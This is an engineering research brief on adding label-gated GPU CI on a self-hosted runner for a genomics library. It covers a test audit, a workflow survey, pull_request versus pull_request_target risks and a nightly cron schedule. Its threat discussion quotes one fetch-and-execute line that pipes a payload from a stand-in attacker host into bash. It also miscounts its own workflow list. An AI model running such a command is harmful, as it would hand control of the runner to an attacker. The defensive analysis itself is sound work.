# NA2 — GPU CI scaffold research brief

Status: research-only. Companion to `.github/workflows/gpu.yml`,
`scripts/setup_gpu_runner.sh`, and `docs/operations/gpu-ci.md`.
This brief documents the inputs to those decisions; consult them for the
canonical configuration.

---

## 1. Audit of existing GPU tests

### File inventory

| File | Lines | `def test_` | CUDA-gate decorations | Estimated wall-time on RTX 2000 Ada |
|---|---|---|---|---|
| `tests/test_gpu.py` | 317 | 14 | `@skip_no_gpu` (~10) | ~30–60 s |
| `tests/test_gpu_model_parity.py` | 431 | 9 (×param) | `@cuda_required` (~9) | ~90–180 s |
| `tests/test_impute_gpu.py` | 300 | 31 | `pytest.mark.skipif` | ~30–60 s |
| `tests/test_impute_gpu_kernels.py` | 293 | 14 | `@cuda_required` (~14) | ~60–120 s |
| **Totals** | 1341 | 68 | 21 explicit gates | **~3–7 min** |

The 21 explicit gate decorations is a lower bound — additional gates
exist as `pytest.mark.skipif(not torch.cuda.is_available(), ...)`
inline within test bodies and parametrize blocks. The marker registered
in `pyproject.toml` (`gpu: tests that require a CUDA device`) is not
yet applied to test functions — current convention is to use
`pytest.mark.skipif` directly. The workflow handles this by running
BOTH `pytest -m gpu` AND the explicit file paths, so coverage is the
union of both.

### Memory footprint (RTX 2000 Ada, 16 GB VRAM)

The largest test fixtures use `n=400, m=1000` (parity tests) and
`n=2000, m=10000` (imputation kernel tests). Both fit comfortably under
2 GB peak — the 16 GB budget is more than 8× the headroom required.
This is sufficient capacity to run the full suite serially with no
chunking. Future UKB-scale work (NA3) will need a larger GPU.

### Test categories

Roughly:

| Category | Count | Files |
|---|---|---|
| CPU↔GPU numerical parity | ~15 | `test_gpu_model_parity.py`, `test_gpu.py::TestGPUEquivalence` |
| CUDA-only correctness (shape, dtype, device-of-output) | ~30 | `test_gpu.py`, `test_impute_gpu.py` |
| Dedicated GPU kernel tests | ~14 | `test_impute_gpu_kernels.py` |
| AMP / mixed-precision | ~5 | `test_gpu.py::TestAMP` |
| Permutation / multiple-testing GPU | ~4 | `test_gpu.py::TestGPUPerm` |

The parity tests are the most valuable — they would have caught both
`adc7b04` and `1e27d81`. The CUDA-only correctness tests are still
useful but are insurance against a second-order class of bugs (a CUDA
op returning the wrong shape on a code path the CPU never exercises).

---

## 2. Survey of existing CI workflows

`.github/workflows/` already contains five workflows:

| File | Purpose | Trigger |
|---|---|---|
| `ci.yml` | Lint + tests on Linux/Windows × Py3.10/3.11/3.12 | `push`, `pull_request` |
| `docker.yml` | Build + smoke the Docker image | `push`, `pull_request` |
| `docs.yml` | Build mkdocs strict | `push`, `pull_request` |
| `gpu.yml` (pre-NA2) | GPU tests, push-to-master + weekly cron only | `push: master`, weekly cron |
| `publish.yml` | PyPI publish | release tags |
| `wheels.yml` | Wheel build matrix | release tags |

The pre-NA2 `gpu.yml` was the right shape but had three gaps that NA2
addresses:

1. **No PR trigger.** A device-alignment regression could land on
   master and only be caught by the next push-to-master run, after
   the PR was already merged. The Pillar C bugs in `adc7b04` and
   `1e27d81` survived precisely because of this gap.
2. **No label gating.** Adding a bare `pull_request` trigger would
   open the pwn-request vector. Label gating closes it.
3. **GitHub-hosted `runs-on: gpu`.** The pre-existing label assumed
   GitHub-hosted GPU runners (`gpu` is reserved for the GitHub-hosted
   GPU pool). The NA2 workflow swaps to `[self-hosted, gpu, rtx-2000-ada]`
   so the maintainer's workstation picks it up. The GitHub-hosted
   GPU pool is invite-only and not currently available to this repo.

NA2 replaces `gpu.yml` rather than adding a parallel file: two GPU
workflows would queue together on the single-GPU runner, doubling
contention. The new `gpu.yml` keeps the nightly cron (now daily
instead of weekly — see §4) and adds the PR-label-gated trigger.

The other four workflows are unaffected.

---

## 3. `pull_request` vs `pull_request_target` security comparison

GitHub's official guidance is that **self-hosted runners on public
repositories must use `pull_request_target`, not `pull_request`**, when
the workflow checks out PR head code. The exploit pattern (a fork PR
rewrites the workflow file and the `pull_request` event runs the
rewritten file) is documented as "Pwn Requests" by GitHub Security Lab.

### `pull_request`

- Workflow file source: PR head (the FORK's view).
- Secrets exposed: none by default.
- Risk on self-hosted runners: **CRITICAL** — a fork PR can replace
  the workflow with `run: curl evil.com/payload.sh | bash` and the
  self-hosted runner will execute it.
- Use case: GitHub-hosted ephemeral runners on public repos. The
  per-job ephemeral container limits blast radius.

### `pull_request_target`

- Workflow file source: BASE branch (master).
- Secrets exposed: full repository secrets (DANGEROUS — must be
  manually scoped).
- Risk on self-hosted runners: **MEDIUM** — fork PRs cannot rewrite
  the workflow, but the workflow may explicitly check out and run
  PR head code. Maintainer must:
  - Use `actions/checkout@v4 with: persist-credentials: false`.
  - Not pass any `secrets.*` into steps that run untrusted code.
  - Gate on a manual label (`gpu-tested` here) so the maintainer
    eyeballs the diff before code runs.
- Use case: self-hosted runners or workflows that need write access
  to the PR base.

References (consulted):

1. GitHub Docs, "About self-hosted runners — Self-hosted runner security":
   <https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security>
2. GitHub Docs, "Events that trigger workflows — pull_request_target":
   <https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#pull_request_target>
3. GitHub Docs, "Security hardening for GitHub Actions":
   <https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions>
4. GitHub Security Lab, "Keeping your GitHub Actions and workflows secure: Preventing pwn requests" (Jacob Pimental, 2021):
   <https://securitylab.github.com/research/github-actions-preventing-pwn-requests/>
5. GitHub Docs, "Autoscaling with self-hosted runners — Using ephemeral runners":
   <https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners#using-ephemeral-runners-for-autoscaling>

The NA2 workflow combines `pull_request_target` + label gating +
`persist-credentials: false` + `--ephemeral` runner registration as
defense in depth. See `docs/operations/gpu-ci.md` §2 for the full
threat-model walkthrough.

---

## 4. Nightly scheduling cadence — recommendation

The pre-existing `gpu.yml` ran weekly (`cron: "0 4 * * 1"`, Mondays
04:00 UTC). The NA2 replacement runs **nightly** (`cron: "0 4 * * *"`).

**Reasoning:**

- **Cost is not the constraint.** The runner is a workstation owned
  by the maintainer; there is no per-minute billing. Compute capacity
  is instead bounded by interactive contention, which is mitigated by
  the 04:00 UTC = 23:00 US Central slot.
- **Time-to-detect matters.** Pillar C found that bugs latent on
  master accumulated faster than weekly runs caught them. The
  device-alignment audit retrospectively found 5 bugs that had been
  on master for varying durations. Daily runs reduce mean
  time-to-detect from ~3.5 days to ~12 hours.
- **Single-job duration is small.** ~6–8 minutes per nightly run
  (estimated; see ops doc §5). Even with 7× the cadence, total weekly
  GPU minutes is bounded at ~50 min — well within budget.

**When to back off to weekly:** if (a) the test suite grows past
30 min/run, or (b) the maintainer's interactive workload starts
contending with the 04:00 UTC slot. Both are easy revert (`* * *` →
`* * 1`).

---

## 5. Benchmark-against-installed-tools concern

Per the user's standing rule (`feedback_benchmark_against_installed_tools`):
benchmarks should compare against installed reference tools, not
against TorchGenomics in another configuration. The GPU CI deliberately
violates this rule for some tests, and it is important to be explicit
about which.

### Tests that ARE head-to-head against an installed reference

**None of the GPU tests are.** The reference tools (GEMMA, GAPIT,
GWASpoly, regenie) are CPU-only — they do not have CUDA builds. Any
GPU↔reference-tool comparison would therefore be:

  TorchGenomics-on-CUDA  vs.  TorchGenomics-on-CPU  vs.  reference-tool-on-CPU

The middle hop (CPU↔reference) is what the `pytest -m golden` suite
already does, and it lives in the main CI (`ci.yml`). The first hop
(GPU↔CPU) is what the GPU-CI parity tests do. Composing the two gives
the chain GPU → CPU → reference, transitive within tolerance.

### Tests that are CUDA-only correctness (NOT head-to-head)

Most of the GPU test suite. Examples:

- `test_gpu.py::TestGPU*::test_*_cuda_outputs` — assert that CUDA
  ops return tensors on `cuda:0` (not silently moved to CPU).
- `test_gpu_model_parity.py::test_single_trait_lmm_produces_cuda_outputs`
  — same shape, GPU-only.
- `test_impute_gpu_kernels.py::test_*` — kernel correctness vs an
  internal CPU reference implementation in the same module.

These are insurance against shape/device/dtype regressions. They do
not validate scientific correctness — they validate that the CUDA
plumbing is intact.

### Tests that ARE TorchGenomics-vs-TorchGenomics parity

`test_gpu.py::TestGPUEquivalence::test_grm_cpu_gpu_match`,
`test_gpu_model_parity.py::test_single_trait_lmm_parity`, and the
other ~15 parity tests assert CPU and GPU TorchGenomics produce
numerically-identical outputs (within FP tolerance). These are the
tests that would have caught `1e27d81` (silent fallback to CPU).

They are NOT head-to-head against GEMMA/GAPIT — that is a
deliberate scope decision. The transitive composition with
`pytest -m golden` covers the gap.

### Recommendation

The GPU CI scope is **correctness of the GPU code path**, not
**numerical agreement with reference tools at GPU speed**. This is
the correct scope for an infra deliverable. A separate post-NA2
deliverable could add `pytest -m "golden and gpu"` (run golden
tests with `--device cuda` and compare against the same reference
fixtures), but that is out of scope here.

This decomposition is documented in `docs/operations/gpu-ci.md` §7.

---

## 6. Inputs verified against repo state

| Claim | Verification |
|---|---|
| GPU test files exist and total ~1341 lines / 68 tests | `wc -l tests/test_gpu*.py` and `grep -c 'def test_'` |
| `gpu` marker registered in pyproject.toml | `grep 'gpu:' pyproject.toml` |
| Existing `gpu.yml` triggers on push/cron only, not PR | `grep -A 5 '^on:' .github/workflows/gpu.yml` (pre-NA2) |
| `adc7b04` is "Pillar C C1 F3: impute tuple unpacking + lmm-scan GPU device alignment" | `git show --stat adc7b04` |
| `1e27d81` is "Post-campaign: device alignment audit — _cmd_glm_scan_single" | `git show --stat 1e27d81` |
| RTX 2000 Ada is the on-machine GPU, 16 GB VRAM, driver 580 | `nvidia-smi` |

All verified at brief-write time; if any of these change, this brief
should be re-validated.
